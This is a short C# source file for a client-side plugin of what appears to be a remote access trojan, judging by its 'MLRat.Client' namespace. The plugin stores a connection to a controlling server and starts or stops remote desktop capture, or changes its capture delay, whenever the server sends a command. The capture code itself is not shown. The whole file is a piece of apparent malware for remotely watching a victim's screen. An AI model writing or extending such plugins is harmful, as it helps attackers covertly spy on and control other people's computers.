using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MLRat.Client;
using System.Diagnostics;
using System.Reflection;

public class MLManagement_Client : IClientPlugin
{
    public void OnConnect(IClientConnection _server)
    {
        Console.WriteLine("[MLManagement] Connected.");
        RemoteDesktop.ServerConnection = _server;
    }

    public void OnDataRecieved(object[] data)
    {
        string command = (string)data[0];
        if (command == "remotedesktop")
        {
            bool start = (bool)data[1];
            if (start)
                RemoteDesktop.Start();
            else
                RemoteDesktop.Stop();
        }
        if (command == "remotedesktopdelay")
        {
            int delay = (int) data[1];
            RemoteDesktop.SetDelay(delay);
            Console.WriteLine("Delay set to {0}", delay);
        }
    }

    public void OnDisconnect()
    {
        Console.WriteLine("[MLManagement] Disconnected");
    }

    public void OnPluginLoad()
    {
        Console.WriteLine("[MLManagement] Loaded!");
        Console.WriteLine("'Location: {0}", Environment.CurrentDirectory);
    }
}
